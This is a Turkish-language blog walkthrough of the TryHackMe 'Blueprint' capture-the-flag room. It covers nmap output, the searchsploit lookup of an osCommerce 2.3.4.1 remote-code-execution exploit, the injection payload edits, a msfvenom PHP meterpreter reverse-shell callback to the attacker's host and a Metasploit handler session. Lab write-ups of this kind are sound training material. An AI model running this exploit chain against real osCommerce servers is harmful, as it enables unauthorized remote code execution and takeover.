---
title: "Blueprint Makine Çözümü"
date: "2025-03-22"
tags: ["ctf", "tryhackme"]
---

Merhabalar, bu yazımda sizlere [TryHackMe](https://tryhackme.com/) platformunda bulunan "Blueprint" isimli makinenin çözümü anlatacağım. Keyifli Okumalar...

1 - *Nmap* aracını kullanarak makine üzerindeki açık portlar ve servisler hakkında detaylı bilgi ediniyorum.

```system
> nmap -sS -sV 10.10.172.220
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-05 17:29 +03
Nmap scan report for 10.10.172.220
Host is up (0.31s latency).
Not shown: 987 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
443/tcp   open  ssl/http     Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3306/tcp  open  mysql        MariaDB (unauthorized)
8080/tcp  open  http         Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49158/tcp open  msrpc        Microsoft Windows RPC
49159/tcp open  msrpc        Microsoft Windows RPC
49160/tcp open  msrpc        Microsoft Windows RPC
```

2 - Makinenin 8080 numaralı portuna gittiğimde "oscommerce-2.3.4" adında bir dizinle karşılaşıyorum. Daha sonra bu bilgiyi searchsploit aracında aratıyorum. 44374 numaralı exploiti indiriyorum.

```
> searchsploit "oscommerce 2.3.4"                                                                                  
------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                      |  Path
------------------------------------------------------------------------------------ ---------------------------------
osCommerce 2.3.4 - Multiple Vulnerabilities                                         | php/webapps/34582.txt
osCommerce 2.3.4.1 - 'currency' SQL Injection                                       | php/webapps/46328.txt
osCommerce 2.3.4.1 - 'products_id' SQL Injection                                    | php/webapps/46329.txt
osCommerce 2.3.4.1 - 'reviews_id' SQL Injection                                     | php/webapps/46330.txt
osCommerce 2.3.4.1 - 'title' Persistent Cross-Site Scripting                        | php/webapps/49103.txt
osCommerce 2.3.4.1 - Arbitrary File Upload                                          | php/webapps/43191.py
osCommerce 2.3.4.1 - Remote Code Execution                                          | php/webapps/44374.py
osCommerce 2.3.4.1 - Remote Code Execution (2)                                      | php/webapps/50128.py
------------------------------------------------------------------------------------ ---------------------------------

> searchsploit -m 44374                                                                                            
  Exploit: osCommerce 2.3.4.1 - Remote Code Execution
      URL: https://www.exploit-db.com/exploits/44374
     Path: /usr/share/exploitdb/exploits/php/webapps/44374.py
    Codes: N/A
 Verified: True
File Type: ASCII text
Copied to: /home/alper/Desktop/TRYHACKME/44374.py
```

3 - Exploit içerisindeki base_url ve target_url değişkenlerini aşağıdaki gibi düzenliyormu. Exploit içerisindeki "ls" komutu kısmını siliyorum. Yerine "msfvenom" aracı ile bir reverse tcp payloadını yerleştiriyorum. Daha sonra "msfconsole" aracını çalıştırarak multi/handler bağlantısını ayarlıyorum. *python3 44374.py" ile kodu çalıştırıyorum ve exploiti sisteme yüklüyorum. Daha sonra bağlantıya tıklayarak reverse_tcp bağlantımı da elde etmiş oluyorum.

```system
base_url = "http://10.10.172.220:8080//oscommerce-2.3.4/catalog/"
target_url = "http://10.10.172.220:8080/oscommerce-2.3.4/catalog/install/install.php?step=4"
```

```system
payload = '\');'
payload += 'system("ls");'    # this is where you enter you PHP payload
payload += '/*'
```

```system
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.8.94.51 LPORT=4444 -e php/base64 raw                            
[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of php/base64
php/base64 succeeded with size 1507 (iteration=0)
php/base64 chosen with final size 1507
Payload size: 1507 bytes
```

```system
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload php/meterpreter/reverse_tcp
payload => php/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > show options 
```

```system
> python3 44374.py                                                                                                 
[+] Successfully launched the exploit. Open the following URL to execute your code

http://10.10.172.220:8080//oscommerce-2.3.4/catalog/install/includes/configure.php
```

```system
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.8.94.51:4444 
[*] Sending stage (39927 bytes) to 10.10.172.220
[*] Meterpreter session 1 opened (10.8.94.51:4444 -> 10.10.172.220:49329) at 2023-06-05 17:46:37 +0300

meterpreter >
```

4 -  CTRL+Z yaparak session'u arkaplana alıyorum ve *sessions -u SESSION_NUMBER* komutu ile mevcut oturumdaki yetkimi yükseltiyorum. Bayrağı okuyarak odayı tamamlıyorum.

```
> type c:\users\administrator\desktop\root.txt.txt
```